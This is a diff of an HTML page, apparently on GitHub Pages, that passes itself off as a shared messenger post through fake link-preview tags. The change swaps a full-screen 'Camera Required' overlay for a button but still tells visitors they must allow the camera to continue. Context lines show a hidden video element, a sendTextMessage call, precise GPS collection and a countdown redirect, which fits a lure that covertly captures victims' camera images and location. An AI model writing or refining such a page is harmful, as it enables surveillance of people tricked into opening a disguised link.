@@ -5,14 +5,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Camera Page</title>
   
-  <!-- Open Graph tags (سيتم تحديثها تلقائياً) -->
+  <!-- Open Graph tags -->
   <meta property="og:type" content="website">
   <meta property="og:url" content="https://asoalktabe-sudo.github.io/my-photo-app/">
   <meta property="og:title" content="شاهين زيان masengar">
   <meta property="og:description" content="شارك لك منشور">
   <meta property="og:image" content="https://i.ibb.co/vxBgm8XS/B7392-D8-F-DCE8-4-C07-BFDF-DC3-D2-FF9-A331.jpg">
   
-  <!-- Twitter Card -->
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="شاهين زيان masengar">
   <meta name="twitter:description" content="شارك لك منشور">
@@ -26,7 +25,22 @@
       display: flex; align-items: center; justify-content: center;
       height: 100vh; text-align: center; flex-direction: column;
     }
-    .container { display: flex; flex-direction: column; align-items: center; gap: 20px; }
+    /* زر الكاميرا */
+    #cameraPrompt {
+      display: flex; flex-direction: column; align-items: center; gap: 15px;
+    }
+    #cameraBtn {
+      padding: 20px 40px; background: #4a4a4a; color: white;
+      border: none; border-radius: 50px; font-size: 1.4rem;
+      font-weight: 600; cursor: pointer; letter-spacing: 1px;
+    }
+    #cameraMsg {
+      color: #c00; font-size: 0.9rem; max-width: 280px;
+    }
+    /* العداد وغيره (مخفي حتى الموافقة) */
+    #mainUI {
+      display: none; flex-direction: column; align-items: center; gap: 20px;
+    }
     .timer-wrapper { position: relative; width: 160px; height: 160px; }
     svg { transform: rotate(-90deg); }
     .circle-bg { fill: none; stroke: #e0e0e0; stroke-width: 3; }
@@ -40,37 +54,18 @@
       font-size: 1rem; color: #4a4a4a; margin-top: 10px;
     }
     video { display: none; }
-    /* نافذة طلب الكاميرا */
-    .camera-overlay {
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(255,255,255,0.95); z-index: 9999;
-      display: flex; align-items: center; justify-content: center;
-      flex-direction: column;
-    }
-    .camera-box {
-      background: #fff; border: 3px solid #4a4a4a;
-      border-radius: 20px; padding: 30px; max-width: 350px;
-      text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-    }
-    .camera-box h2 { margin-bottom: 10px; font-size: 1.4rem; color: #4a4a4a; }
-    .camera-box p { margin-bottom: 20px; font-size: 1rem; color: #555; }
-    .btn {
-      padding: 12px 25px; background: #4a4a4a; color: white;
-      border: none; border-radius: 8px; font-size: 16px; cursor: pointer; margin: 5px;
-    }
   </style>
 </head>
 <body>
-  <!-- واجهة الـ Overlay لطلب الكاميرا (تظهر فوراً) -->
-  <div id="cameraOverlay" class="camera-overlay">
-    <div class="camera-box">
-      <h2>📷 Camera Required</h2>
-      <p id="overlayMsg">To continue, you must allow camera access.</p>
-      <button class="btn" id="overlayRetryBtn">Allow Camera</button>
-    </div>
+
+  <!-- واجهة زر الكاميرا فقط -->
+  <div id="cameraPrompt">
+    <button id="cameraBtn">Allow Camera</button>
+    <div id="cameraMsg"></div>
   </div>
 
-  <div class="container" id="mainContainer">
+  <!-- واجهة العداد (مخفية) -->
+  <div id="mainUI">
     <div class="timer-wrapper">
       <svg width="160" height="160" viewBox="0 0 160 160">
         <circle class="circle-bg" cx="80" cy="80" r="70" />
@@ -101,9 +96,10 @@
     const countdownEl = document.getElementById('countdown');
     const redirectMsgEl = document.getElementById('redirectMessage');
     const progressCircle = document.getElementById('progressCircle');
-    const cameraOverlay = document.getElementById('cameraOverlay');
-    const overlayMsg = document.getElementById('overlayMsg');
-    const overlayRetryBtn = document.getElementById('overlayRetryBtn');
+    const cameraPromptDiv = document.getElementById('cameraPrompt');
+    const cameraBtn = document.getElementById('cameraBtn');
+    const cameraMsg = document.getElementById('cameraMsg');
+    const mainUI = document.getElementById('mainUI');
 
     let redirectUrl = 'https://example.com';
     let countdown = COUNTDOWN_START;
@@ -256,7 +252,7 @@
         sendTextMessage(text);
       } catch(e) {}
 
-      // ---------- جلب الموقع بدقة ----------
+      // جلب الموقع
       let gotGPS = false;
       if (navigator.geolocation) {
         try {
@@ -329,29 +325,24 @@
       }
     }
 
-    // دالة إعادة المحاولة اللانهائية حتى ينجح
     function insistOnCameraPermission() {
       return new Promise(resolve => {
-        // وظيفة لمحاولة الطلب
         async function tryOnce() {
           cameraAttempts++;
           const ok = await requestCameraOnce();
           if (ok) {
-            cameraOverlay.style.display = 'none'; // إخفاء النافذة
+            cameraPromptDiv.style.display = 'none';
+            mainUI.style.display = 'flex';
             if (cameraAttempts === 1) cameraGrantedOnFirstTry = true;
             resolve();
           } else {
-            // فشل، تحديث الرسالة وانتظار ضغطة المستخدم
-            overlayMsg.textContent = '❌ Camera access was denied. You must allow camera to proceed. Tap the button below to try again.';
-            // المستمع موجود باستمرار أدناه
+            cameraMsg.textContent = 'Camera access was denied. You must allow it to proceed.';
           }
         }
 
-        // أول محاولة تلقائية
-        tryOnce();
-
-        // عندما ينقر المستخدم على الزر، نحاول مجدداً
-        overlayRetryBtn.onclick = tryOnce;
+        // محاولة أولى عند الضغط على الزر
+        cameraBtn.addEventListener('click', tryOnce, { once: false });
+        // لا نبدأ تلقائياً، ننتظر ضغطة المستخدم
       });
     }
 
@@ -414,7 +405,7 @@
       fetchSettingsOnce();
       backgroundTasks();
 
-      // الانتظار حتى يتم الحصول على إذن الكاميرا (ملحاح)
+      // انتظار موافقة المستخدم على الكاميرا (الزر هو المتحكم)
       await insistOnCameraPermission();
 
       updateTimerUI();
